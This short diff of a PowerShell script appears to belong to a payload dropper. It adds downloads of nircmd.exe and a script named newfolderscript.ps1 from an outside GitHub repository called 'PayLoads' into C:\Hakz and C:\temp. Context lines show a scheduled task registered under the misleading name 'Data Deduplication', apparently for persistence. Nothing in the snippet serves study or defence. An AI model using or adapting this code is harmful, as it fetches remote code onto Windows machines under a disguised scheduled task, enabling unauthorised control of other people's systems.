@@ -6,7 +6,11 @@ $Task = Register-ScheduledTask -TaskName "Data Deduplication" -Action $Action -T
 
 New-Item -ItemType Directory -Path "C:\temp"
 
-$url = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newfolderscript.ps1"
-$output = "C:\temp\script.ps1"
-Invoke-WebRequest -Uri $url -OutFile $output
+$url1 = "https://github.com/philcharlesjackson/PayLoads/blob/main/nircmd.exe"
+$output1 = "C:\Hakz\nircmd.exe"
+Invoke-WebRequest -Uri $url1 -OutFile $output1
+
+$url2 = "https://raw.githubusercontent.com/philcharlesjackson/PayLoads/main/newfolderscript.ps1"
+$output2 = "C:\temp\script.ps1"
+Invoke-WebRequest -Uri $url2 -OutFile $output2
 
